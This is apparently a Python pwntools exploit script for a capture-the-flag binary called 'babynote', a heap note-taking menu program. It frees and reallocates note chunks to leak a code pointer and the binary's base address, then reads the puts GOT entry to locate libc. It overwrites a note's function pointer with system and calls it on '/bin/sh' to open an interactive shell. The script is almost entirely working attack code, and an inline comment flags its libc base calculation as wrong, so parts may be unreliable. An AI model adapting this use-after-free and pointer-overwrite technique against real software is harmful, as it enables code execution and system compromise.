#!/usr/bin/env python
#encoding: utf-8

from pwn import *

context.log_level = "debug"
binary = "./babynote"
io = process(binary)
e = ELF(binary)
e.checksec()
LIBC = "libc.so.6"
libc = ELF(LIBC)

gdb.attach(io, '''
	c
''')

def add(size, content):
	io.recvuntil("Your choice :")
	io.sendline("1")
	io.recvuntil("size:")
	io.sendline(str(size))
	io.recvuntil("content:")
	io.sendline(content)

def edit(index, content):
	io.recvuntil("Your choice :")
	io.sendline("2")
	io.recvuntil("index:")
	io.sendline(str(index))
	io.recvuntil("content:")
	io.sendline(content)

def show(index):
	io.recvuntil("Your choice :")
	io.sendline("3")
	io.recvuntil("index:")
	io.sendline(str(index))

def delete(index):
	io.recvuntil("Your choice :")
	io.sendline("4")
	io.recvuntil("index:")
	io.sendline(str(index))


add(100, "a")
add(100, "b")
delete(0)
delete(1)
add(12, "aaaaaaa")
show(2)

io.recvuntil("aaaaaaa\n")
data = io.recv(4)
data = data[::-1].encode('hex')
func = int(data, 16)
elf_addr = func - 0x98a #func_point
puts_got = elf_addr + e.got["puts"]
edit(2, pack(0x0c) + pack(puts_got) + pack(func))
show(0)
puts_addr = int(io.recv(4)[::-1].encode("hex"),16)
print "libc_puts:" + hex(libc.symbols["puts"])
print "puts_got:" + hex(e.got["puts"])
print "puts_addr:" + hex(puts_addr)
libc.address = puts_addr - libc.symbols["puts"] #wrong base address
system_addr = libc.symbols["system"]
print "system :" + hex(system_addr)
edit(2, '/bin/sh\x00' + pack(system_addr))
show(0)
io.interactive()
io.close()




